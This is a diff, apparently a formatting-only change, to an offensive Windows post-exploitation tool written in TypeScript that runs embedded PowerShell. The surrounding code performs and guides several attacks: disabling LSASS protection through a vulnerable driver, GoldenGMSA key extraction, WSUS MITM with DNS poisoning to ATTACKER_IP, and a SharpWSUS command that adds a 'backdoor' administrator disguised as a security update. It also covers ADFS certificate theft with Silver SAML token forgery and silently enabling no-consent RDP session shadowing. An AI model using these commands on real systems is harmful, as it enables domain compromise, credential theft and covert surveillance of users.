@@ -20592,8 +20592,10 @@ Write-Output "Test Signing: $(if ($testSigning -match 'Yes') { 'ENABLED (drivers
         status: "PROTECTED",
         resource: "Credential Guard",
         title: "Credential Guard (VBS) active — LSASS credentials isolated in secure enclave",
-        details: "Credential Guard isolates NTLM hashes and Kerberos tickets in a Hyper-V protected container. Even with PPL bypass, credentials may not be extractable from LSASS. Consider Kerberos attacks (kerberoast, delegation_abuse) or DPAPI-based extraction instead.",
-        remediation: "Credential Guard cannot be bypassed without disabling VBS at boot. Pivot to non-LSASS credential sources.",
+        details:
+          "Credential Guard isolates NTLM hashes and Kerberos tickets in a Hyper-V protected container. Even with PPL bypass, credentials may not be extractable from LSASS. Consider Kerberos attacks (kerberoast, delegation_abuse) or DPAPI-based extraction instead.",
+        remediation:
+          "Credential Guard cannot be bypassed without disabling VBS at boot. Pivot to non-LSASS credential sources.",
       })
     }
   }
@@ -20749,7 +20751,8 @@ if ($privs -match 'SeLoadDriverPrivilege.*Enabled') {
         status: "BYPASS_READY",
         resource: `driver://${driver}`,
         title: `Vulnerable driver ${driver} loaded — PPL bypass ready`,
-        details: "Driver is loaded and ready for PPL disable. Run the tool command to zero EPROCESS.Protection on LSASS.",
+        details:
+          "Driver is loaded and ready for PPL disable. Run the tool command to zero EPROCESS.Protection on LSASS.",
         remediation: "After credential extraction, unload driver and restore PPL.",
       })
     }
@@ -20864,7 +20867,8 @@ if ($bitsReg) {
         status: "SUSPICIOUS",
         resource: "bits://jobs",
         title: "BITS job with NotifyCmdLine found — possible persistence",
-        details: "A BITS transfer job has a notification command configured, which executes when the job completes. This is a known persistence technique.",
+        details:
+          "A BITS transfer job has a notification command configured, which executes when the job completes. This is a known persistence technique.",
         remediation: "Review and remove suspicious BITS jobs: Get-BitsTransfer -AllUsers | Remove-BitsTransfer",
       })
     }
@@ -21134,7 +21138,8 @@ if ($wsusServer) {
         status: "INFO",
         resource: wsusUrl[1],
         title: `WSUS server configured: ${wsusUrl[1]}`,
-        details: "Machine receives updates from a WSUS server. If this server is compromised, all clients can receive malicious updates.",
+        details:
+          "Machine receives updates from a WSUS server. If this server is compromised, all clients can receive malicious updates.",
         remediation: "Ensure WSUS server is hardened, uses HTTPS, and has restricted admin access.",
       })
     }
@@ -21224,7 +21229,8 @@ Write-Output "ATTACKABLE=$(if ($isHttp) { '1' } else { '0' })"
         status: "EXPLOITABLE",
         resource: "wsus://mitm",
         title: "WSUS MITM attack feasible — HTTP update channel",
-        details: "WSUS uses HTTP, allowing update injection via network MITM. Use SharpWSUS or WSUSpendu for domain-wide SYSTEM execution.",
+        details:
+          "WSUS uses HTTP, allowing update injection via network MITM. Use SharpWSUS or WSUSpendu for domain-wide SYSTEM execution.",
         remediation: "Migrate WSUS to HTTPS. As interim, enable certificate pinning.",
       })
     }
@@ -21244,7 +21250,9 @@ Write-Output "ATTACKABLE=$(if ($isHttp) { '1' } else { '0' })"
     output.push("  # Or DNS poison: winhook adidns_poison --action inject --name WSUS_HOSTNAME --ip ATTACKER_IP")
     output.push("")
     output.push("Step 3: Use SharpWSUS on attacker machine")
-    output.push('  SharpWSUS.exe create /payload:"C:\\Windows\\System32\\cmd.exe" /args:"/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add" /title:"Critical Security Update"')
+    output.push(
+      '  SharpWSUS.exe create /payload:"C:\\Windows\\System32\\cmd.exe" /args:"/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add" /title:"Critical Security Update"',
+    )
     output.push("  SharpWSUS.exe approve /updateid:GUID /computername:TARGET")
     output.push("")
     output.push("Step 4: Force client update check")
@@ -21409,7 +21417,8 @@ try {
         resource: "ad://kds-root-key",
         title: "KDS root key data readable — GoldenGMSA attack possible",
         details: `KDS root key material is accessible. With this key, gMSA passwords can be computed OFFLINE for any managed service account without DC connectivity. Use --action extract to dump key material.`,
-        remediation: "Restrict read access to KDS root keys. Only Domain Controllers should have access to msKds-RootKeyData.",
+        remediation:
+          "Restrict read access to KDS root keys. Only Domain Controllers should have access to msKds-RootKeyData.",
       })
     }
 
@@ -21421,7 +21430,8 @@ try {
         status: "INFO",
         resource: "ad://gmsa",
         title: `${gmsaCount[1]} gMSA accounts found — potential GoldenGMSA targets`,
-        details: "Group Managed Service Accounts use KDS-derived passwords. If KDS root key is extracted, all gMSA passwords can be computed offline.",
+        details:
+          "Group Managed Service Accounts use KDS-derived passwords. If KDS root key is extracted, all gMSA passwords can be computed offline.",
         remediation: "Monitor KDS root key access, rotate keys periodically.",
       })
     }
@@ -21497,7 +21507,8 @@ if ($results.Count -eq 0) {
         status: "EXTRACTED",
         resource: "ad://kds-root-key",
         title: "KDS root key material extracted — offline gMSA password computation possible",
-        details: "Root key data has been extracted. Use GoldenGMSA.exe or gMSADumper to compute passwords for any gMSA account without DC connectivity.",
+        details:
+          "Root key data has been extracted. Use GoldenGMSA.exe or gMSADumper to compute passwords for any gMSA account without DC connectivity.",
         remediation: "Rotate KDS root keys, revoke compromised gMSA accounts, audit key access.",
       })
     }
@@ -21643,7 +21654,9 @@ try {
 }
 
 # Check for Entra ID federation metadata
-${adfsServer ? `
+${
+  adfsServer
+    ? `
 Write-Output ""
 Write-Output "=== Federation Metadata ==="
 try {
@@ -21660,7 +21673,9 @@ try {
 } catch {
   Write-Output "[-] Cannot fetch metadata: $_"
 }
-` : ''}
+`
+    : ""
+}
 `
     const r = await ps(script, timeout)
     output.push(r.stdout)
@@ -21677,7 +21692,8 @@ try {
         resource: "adfs://local",
         title: "ADFS server found — Silver SAML attack possible if signing cert is extracted",
         details: `ADFS is running locally${rpCount ? ` with ${rpCount[1]} relying party trusts` : ""}. Extract the token-signing certificate (private key) to forge SAML assertions for any federated user.`,
-        remediation: "Restrict ADFS admin access, use HSM for token-signing keys, enable Entra ID certificate rotation.",
+        remediation:
+          "Restrict ADFS admin access, use HSM for token-signing keys, enable Entra ID certificate rotation.",
       })
     }
   }
@@ -21773,8 +21789,10 @@ try {
         status: "EXTRACTED",
         resource: exportPath ? exportPath[1] : "adfs://signing-cert",
         title: "ADFS token-signing certificate extracted with private key",
-        details: "Token-signing certificate exported as PFX. This key can forge SAML tokens for ANY federated user, granting access to all relying party trusts (O365, AWS, etc.).",
-        remediation: "Rotate ADFS signing certificate immediately, revoke current certificate, audit federated access logs.",
+        details:
+          "Token-signing certificate exported as PFX. This key can forge SAML tokens for ANY federated user, granting access to all relying party trusts (O365, AWS, etc.).",
+        remediation:
+          "Rotate ADFS signing certificate immediately, revoke current certificate, audit federated access logs.",
       })
     }
   }
@@ -21795,7 +21813,9 @@ try {
     output.push("")
     output.push("Option 1: ADFSToolkit (PowerShell)")
     output.push(`  New-SAMLToken -Certificate '${certPath}' -User '${targetUser}' \\`)
-    output.push(`    -Audience '${audience || "urn:federation:MicrosoftOnline"}' -Issuer 'http://ADFS_HOST/adfs/services/trust'`)
+    output.push(
+      `    -Audience '${audience || "urn:federation:MicrosoftOnline"}' -Issuer 'http://ADFS_HOST/adfs/services/trust'`,
+    )
     output.push("")
     output.push("Option 2: SilverSAMLForger (Python)")
     output.push(`  python3 silversaml.py --pfx '${certPath}' --user '${targetUser}' \\`)
@@ -21918,7 +21938,8 @@ Write-Output "NLA Required: $(if ($nla -eq 1) { 'YES' } else { 'NO' })"
         status: "NO_CONSENT",
         resource: "rdp://shadow-policy",
         title: "RDP shadow allowed WITHOUT user consent",
-        details: "Shadow policy permits shadowing active sessions without the user seeing a consent prompt. This enables completely silent session observation.",
+        details:
+          "Shadow policy permits shadowing active sessions without the user seeing a consent prompt. This enables completely silent session observation.",
         remediation: "Set shadow policy to require user permission (mode 1 or 3).",
       })
     }
@@ -21946,7 +21967,9 @@ Write-Output $session
 Write-Output ""
 
 # Check shadow policy allows no-consent if requested
-${noConsent ? `
+${
+  noConsent
+    ? `
 $shadowPolicy = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -ErrorAction SilentlyContinue).Shadow
 if ($shadowPolicy -ne 2 -and $shadowPolicy -ne 4) {
   Write-Output "[!] WARNING: Shadow policy may require user consent"
@@ -21954,16 +21977,22 @@ if ($shadowPolicy -ne 2 -and $shadowPolicy -ne 4) {
   Write-Output "    reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f"
   Write-Output ""
 }
-` : ""}
+`
+    : ""
+}
 
 # Configure shadow settings for no-consent if needed
-${noConsent ? `
+${
+  noConsent
+    ? `
 Write-Output "[*] Configuring no-consent shadow..."
 Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
 Write-Output "[+] Shadow policy set to: Full Control without consent"
 Write-Output "POLICY_SET=1"
 Write-Output ""
-` : ""}
+`
+    : ""
+}
 
 # Start shadow session
 Write-Output "[*] Launching shadow session..."
@@ -22120,7 +22149,8 @@ if ($unsigned -gt 0) {
         status: "SUSPICIOUS",
         resource: "spooler://monitors",
         title: `${unsigned[1]} unsigned print monitor DLL(s) found — possible existing persistence`,
-        details: "Unsigned DLLs in print monitor registry may indicate existing malicious persistence. Legitimate monitors are typically signed by their vendor.",
+        details:
+          "Unsigned DLLs in print monitor registry may indicate existing malicious persistence. Legitimate monitors are typically signed by their vendor.",
         remediation: "Investigate unsigned monitor DLLs, verify against known-good baseline.",
       })
     }
@@ -22139,9 +22169,10 @@ if ($unsigned -gt 0) {
       return { output: output.join("\n"), findings }
     }
 
-    const regPath = monType === "port"
-      ? `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}\\Ports`
-      : `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`
+    const regPath =
+      monType === "port"
+        ? `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}\\Ports`
+        : `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`
 
     const script = `
 Write-Output "=== Installing ${monType === "port" ? "Port" : "Print"} Monitor ==="
@@ -22701,7 +22732,7 @@ if (Test-Path $exePath) {
       output.push(r.stdout)
     }
 
-    const succeeded = output.some(o => o.includes("STATUS=SUCCESS"))
+    const succeeded = output.some((o) => o.includes("STATUS=SUCCESS"))
     if (succeeded) {
       findings.push({
         checkId: "WIN-CLM-010",
